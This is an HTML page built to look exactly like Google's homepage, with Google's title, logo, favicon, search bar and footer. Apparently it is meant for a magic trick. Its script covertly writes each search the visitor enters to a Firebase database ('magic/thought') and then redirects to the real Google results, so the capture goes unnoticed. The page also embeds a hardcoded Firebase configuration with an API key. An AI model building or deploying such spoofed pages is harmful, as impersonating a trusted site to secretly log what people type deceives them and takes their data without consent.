<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Google</title>
    <link rel="icon" href="https://www.google.com/favicon.ico">
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
    <style>
        * { box-sizing: border-box; margin: 0; padding: 0; -webkit-tap-highlight-color: transparent; }
        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background: #ffffff; color: #202124; display: flex; flex-direction: column; height: 100vh; justify-content: space-between; }
        
        /* Top Navigation Header */
        header { display: flex; justify-content: flex-end; align-items: center; padding: 12px 20px; font-size: 14px; }
        header a { color: #5f6368; text-decoration: none; margin-left: 18px; font-weight: 400; }
        .app-icon { width: 24px; height: 24px; fill: #5f6368; cursor: pointer; margin-left: 18px; }
        .sign-in-btn { background: #1a73e8; color: #ffffff !important; padding: 8px 20px; border-radius: 4px; font-weight: 500; text-decoration: none !important; margin-left: 18px; }

        /* Main Container */
        main { display: flex; flex-direction: column; align-items: center; margin-top: 60px; width: 100%; padding: 0 16px; flex-grow: 1; }
        .logo { margin-bottom: 28px; text-align: center; }
        .logo img { width: 272px; height: auto; }

        /* Real Google Search Bar UI */
        .search-wrapper { width: 100%; max-width: 584px; position: relative; }
        .search-box { width: 100%; height: 48px; border: 1px solid #dfe1e5; border-radius: 24px; padding: 0 90px 0 46px; font-size: 16px; outline: none; box-shadow: none; transition: all 0.2s ease-in-out; }
        .search-box:hover, .search-box:focus { box-shadow: 0 1px 6px rgba(32,33,36,0.28); border-color: rgba(223,225,229,0); }

        .search-icon { position: absolute; left: 14px; top: 14px; fill: #9aa0a6; width: 20px; height: 20px; }
        
        .right-icons { position: absolute; right: 16px; top: 12px; display: flex; align-items: center; gap: 12px; }
        .mic-icon, .lens-icon { width: 24px; height: 24px; cursor: pointer; }

        /* Search Buttons */
        .buttons { margin-top: 30px; display: flex; gap: 12px; justify-content: center; width: 100%; }
        .btn { background-color: #f8f9fa; border: 1px solid #f8f9fa; border-radius: 4px; color: #3c4043; font-size: 14px; padding: 10px 18px; cursor: pointer; font-weight: 400; }
        .btn:hover { border: 1px solid #dadce0; color: #202124; box-shadow: 0 1px 1px rgba(0,0,0,0.1); }

        /* Languages Banner */
        .languages { font-size: 13px; margin-top: 28px; color: #4d5156; text-align: center; }
        .languages a { color: #1a0dab; text-decoration: none; margin: 0 4px; }

        /* Real Google Footer */
        footer { background: #f2f2f2; color: #70757a; font-size: 14px; width: 100%; }
        .location { padding: 14px 20px; border-bottom: 1px solid #dadce0; font-size: 15px; }
        .footer-links { display: flex; flex-wrap: wrap; justify-content: space-between; padding: 14px 20px; }
        .footer-links a { color: #70757a; text-decoration: none; margin-right: 20px; font-size: 14px; }

        @media (max-width: 600px) {
            .logo img { width: 160px; }
            main { margin-top: 40px; }
            .buttons { display: none; } /* Mobile View-ൽ ഒറിജിനൽ ഗൂഗിളിൽ ഈ ബട്ടണുകൾ ഉണ്ടാകാറില്ല */
        }
    </style>
</head>
<body>

    <header>
        <a href="#">Gmail</a>
        <a href="#">Images</a>
        <svg class="app-icon" viewBox="0 0 24 24"><path d="M6 8c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm6 0c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm6 0c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zM6 14c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm6 0c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm6 0c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zM6 20c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm6 0c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2zm6 0c1.1 0 2-.9 2-2s-.9-2-2-2-2 .9-2 2 .9 2 2 2z"/></svg>
        <a href="#" class="sign-in-btn">Sign in</a>
    </header>

    <main>
        <div class="logo">
            <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_272x91dp.png" alt="Google">
        </div>

        <form class="search-wrapper" onsubmit="performSearch(event)">
            <svg class="search-icon" viewBox="0 0 24 24"><path d="M15.5 14h-.79l-.28-.27A6.471 6.471 0 0 0 16 9.5 6.5 6.5 0 1 0 9.5 16c1.61 0 3.09-.59 4.23-1.57l.27.28v.79l5 4.99L20.49 19l-4.99-5zm-6 0C7.01 14 5 11.99 5 9.5S7.01 5 9.5 5 14 7.01 14 9.5 11.99 14 9.5 14z"/></svg>
            
            <input type="text" id="searchInput" class="search-box" autocomplete="off" autofocus>
            
            <div class="right-icons">
                <!-- Google Mic Icon -->
                <svg class="mic-icon" viewBox="0 0 24 24"><path fill="#4285f4" d="m12 15c1.66 0 3-1.34 3-3v-6c0-1.66-1.34-3-3-3s-3 1.34-3 3v6c0 1.66 1.34 3 3 3z"/><path fill="#34a853" d="m11 18.08h2v3h-2z"/><path fill="#fbbc05" d="m7.05 16.87c-1.27-1.27-2.05-3.02-2.05-4.95h-2c0 2.48 1 4.73 2.63 6.37z"/><path fill="#ea4335" d="m12 17c-2.76 0-5-2.24-5-5h-2c0 3.53 2.61 6.43 6 6.92v2.08h2v-2.08c3.39-.49 6-3.39 6-6.92h-2c0 2.76-2.24 5-5 5z"/></svg>
                <!-- Google Lens Camera Icon -->
                <svg class="lens-icon" viewBox="0 0 192 192"><path fill="#4285F4" d="M128 32a16 16 0 0 1 16 16v16h16a16 16 0 0 1 16 16v64a16 16 0 0 1-16 16H32a16 16 0 0 1-16-16V80a16 16 0 0 1 16-16h16V48a16 16 0 0 1 16-16h48z"/><circle cx="96" cy="112" r="32" fill="#FFF"/></svg>
            </div>
        </form>

        <div class="buttons">
            <button class="btn" onclick="performSearch(event)">Google Search</button>
            <button class="btn" onclick="performSearch(event)">I'm Feeling Lucky</button>
        </div>

        <div class="languages">
            Google offered in: <a href="#">മലയാളം</a> <a href="#">हिन्दी</a> <a href="#">தமிழ்</a>
        </div>
    </main>

    <footer>
        <div class="location">India</div>
        <div class="footer-links">
            <div><a href="#">About</a><a href="#">Advertising</a><a href="#">Business</a></div>
            <div><a href="#">Privacy</a><a href="#">Terms</a><a href="#">Settings</a></div>
        </div>
    </footer>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyCGy1QcZfvh4SoEdcVcSGl-_jdSCagH4sE",
            authDomain: "magicapp-7c8e1.firebaseapp.com",
            databaseURL: "https://magicapp-7c8e1-default-rtdb.firebaseio.com",
            projectId: "magicapp-7c8e1",
            storageBucket: "magicapp-7c8e1.appspot.com",
            messagingSenderId: "26285258962",
            appId: "1:26285258962:web:c94661ee24dbf5cd35550b"
        };
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        function performSearch(event) {
            if(event) event.preventDefault();
            
            const query = document.getElementById('searchInput').value.trim();
            if (query !== "") {
                // Firebase-ലേക്ക് സേവ് ചെയ്യുന്നു
                database.ref('magic/thought').set(query.toUpperCase() + "_" + Date.now()).then(() => {
                    // അപ്പപ്പോൾ തന്നെ ഗൂഗിളിന്റെ ഒഫീഷ്യൽ സെർച്ച് റിസൾട്ടിലേക്ക് പോകുന്നു
                    window.location.href = "https://www.google.com/search?q=" + encodeURIComponent(query);
                });
            }
        }
    </script>
</body>
</html>
